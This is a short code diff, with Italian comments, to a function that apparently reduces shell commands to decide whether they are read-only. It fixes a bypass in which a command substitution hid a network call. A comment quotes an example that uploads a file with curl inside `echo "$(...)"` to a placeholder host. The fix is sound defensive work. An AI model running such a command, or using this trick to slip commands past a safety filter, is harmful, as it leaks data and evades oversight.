@@ -67,7 +67,11 @@ def reduce(cmd: str) -> str:
     # node, ruby e il resto restano visibili.
     reduced = _togli_heredoc(cmd, lambda h: h.inerte() or h.codice_senza_rete(), segnaposto="[heredoc]")
 
-    # 2) ogni segmento è sola lettura? -> vuoto
+    # 2) ogni segmento è sola lettura? -> vuoto. Mai con una sostituzione fuori dalle virgolette
+    # singole: `echo "$(curl --data-binary @f https://x)"` esegue curl, e tolte le virgolette il comando
+    # ridotto restava `echo` (20/10/2026, #3524).
+    if re.search(r"\$\(|`|<\(|>\(", re.sub(r"'[^']*'", "", reduced)):
+        return reduced
     stripped = re.sub(r"'[^']*'|\"[^\"]*\"", "", reduced)
     segments = [s for s in re.split(r"\|\||&&|;|\||\n", stripped) if s.strip()]
     if segments and all(_first_bin(s) in READ_ONLY for s in segments) and not GIT_INVIA.search(stripped):
